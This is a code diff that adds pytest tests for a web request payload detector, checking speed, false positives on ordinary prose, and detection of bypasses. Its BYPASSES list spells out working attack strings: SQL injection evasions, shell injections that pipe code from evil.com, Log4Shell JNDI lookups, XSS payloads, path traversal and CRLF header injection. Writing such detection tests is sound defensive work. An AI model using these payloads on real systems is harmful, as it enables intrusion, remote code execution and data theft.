@@ -125,3 +125,130 @@ def test_content_type_ignored_without_body():
         "/x", "", b"", content_type="application/octet-stream"
     )
     assert "unusual-content-type" not in result
+
+
+# --- Final review fix pass (2026-11-07) -----------------------------------
+
+
+@pytest.mark.parametrize(
+    "body",
+    [b"%0a" + b"\n" * 65000, b"%0a" + b"\r" * 32000 + b"\n" * 32000, b"%0a" + b"\n " * 32000],
+)
+def test_line_break_flood_is_fast(body):
+    start = time.perf_counter()
+    detect_payload_indicators("/x", "", body)
+    assert time.perf_counter() - start < 0.2
+
+
+def _multipart_png() -> bytes:
+    return (
+        b"--b\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"a.png\"\r\n"
+        b"Content-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\r\n--b--\r\n"
+    )
+
+
+@pytest.mark.parametrize(
+    "body,content_type",
+    [
+        (_multipart_png(), "multipart/form-data; boundary=b"),
+        ('{"name": "Ana"}'.encode("utf-16"), "application/json"),
+    ],
+)
+def test_literal_nul_in_binary_body_is_not_null_byte(body, content_type):
+    assert "null-byte" not in detect_payload_indicators("/x", "", body, content_type=content_type)
+
+
+@pytest.mark.parametrize("body", [b'{"dni": "\u0000"}', b"dni=&#0;", b"dni=%00"])
+def test_encoded_nul_is_null_byte(body):
+    assert "null-byte" in detect_payload_indicators("/x", "", body)
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        b"comment=Great+post%21%0D%0Ahttps%3A%2F%2Fexample.com%2Fdocs",
+        b"msg=Hi+team%0D%0ARe%3A+yesterday",
+        b"addr=Line1%0D%0Aattn%3A+Bob",
+        b"body=Hi%0D%0AThanks%2C%0D%0ABob%0D%0ATel%3A+555-1234",
+    ],
+)
+def test_multiline_form_field_is_not_header_injection(body):
+    assert "header-injection" not in detect_payload_indicators("/x", "", body)
+
+
+@pytest.mark.parametrize(
+    "query",
+    ["next=%0d%0aLocation:%20https://evil.example", "x=1%0d%0aX-Forwarded-Host:%20evil"],
+)
+def test_response_header_injection_detected(query):
+    assert "header-injection" in detect_payload_indicators("/x", query, b"")
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        b'{"text": "| id | name |\n|---|---|"}',
+        b'{"text": "| user | pwd |"}',
+        b'{"text": "Set it to \'auto\'; then save"}',
+        b'{"text": "Hmm...\nok"}',
+        b'{"text": "he said \\"wait..\\" and left"}',
+        b"See [guide](../guide.md) for details",
+        b"import x from '../lib/util'",
+        b'{"text": "is \'a\' or b > c"}',
+        b"name' and 'x' like 'y",
+        b"Drop table tennis practice",
+        b'{"html": "<svg viewBox=\\"0 0 10 10\\"></svg>"}',
+        b'{"html": "<iframe src=\\"https://www.youtube.com/embed/x\\"></iframe>"}',
+    ],
+)
+def test_common_prose_and_markup_not_flagged(body):
+    high = {"sql-like", "xss", "path-traversal", "rce-indicator", "header-injection", "null-byte"}
+    assert not high & set(detect_payload_indicators("/x", "", body))
+
+
+BYPASSES = [
+    (b"1/*!50000union*/+/*!50000select*/+1", "sql-like"),
+    (b"-1 UN/**/ION SEL/**/ECT password FROM users", "sql-like"),
+    (b"un%2f%2a%2a%2fion select 1", "sql-like"),
+    (b"1 union--x%0aselect 1", "sql-like"),
+    (b"1 union%23x%0aselect 1", "sql-like"),
+    (b"-1 union(select 1)", "sql-like"),
+    (b"1 union distinct select 1", "sql-like"),
+    (b"1'or'1'='1", "sql-like"),
+    (b"1'||1=1--", "sql-like"),
+    (b"1 and extractvalue(1,concat(0x7e,version()))", "sql-like"),
+    (b"1 and updatexml(1,concat(0x7e,user()),1)", "sql-like"),
+    (b"1 and sleep(5-0)", "sql-like"),
+    (b"127.0.0.1%0aid", "rce-indicator"),
+    (b"x;cat flag.txt", "rce-indicator"),
+    (b"x;curl evil.com|sh", "rce-indicator"),
+    (b"x;wget evil.com/x", "rce-indicator"),
+    (b"x;cat${IFS}/etc/hosts", "rce-indicator"),
+    (b"x;/???/c?t /???/p??s??", "rce-indicator"),
+    (b"${${lower:j}ndi:ldap://x/a}", "rce-indicator"),
+    (b"${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}", "rce-indicator"),
+    (b"<div onpointerenter=alert(1)>", "xss"),
+    (b"<a onfocusin=alert(1)>", "xss"),
+    (b"<a href='java%09script:alert(1)'>x</a>", "xss"),
+    (b"next=data:text/html;base64,PHNjcmlwdD4=", "xss"),
+    (b"<iframe srcdoc='<script>alert(1)</script>'>", "xss"),
+    (b"/x/..;/admin", "path-traversal"),
+    (b"file=/proc/self/environ", "path-traversal"),
+]
+
+
+@pytest.mark.parametrize("body,label", BYPASSES)
+def test_review_bypass_detected(body, label):
+    assert label in detect_payload_indicators("/x", "", body)
+
+
+def test_attack_after_padding_is_detected():
+    body = b"a=" + b"x" * 65536 + b"&q=' union select password from users--"
+    assert "sql-like" in detect_payload_indicators("/x", "", body)
+
+
+def test_full_bounded_body_is_fast():
+    body = (b"x" * 1023 + b"\n") * 1024
+    start = time.perf_counter()
+    detect_payload_indicators("/x", "", body)
+    assert time.perf_counter() - start < 1.0
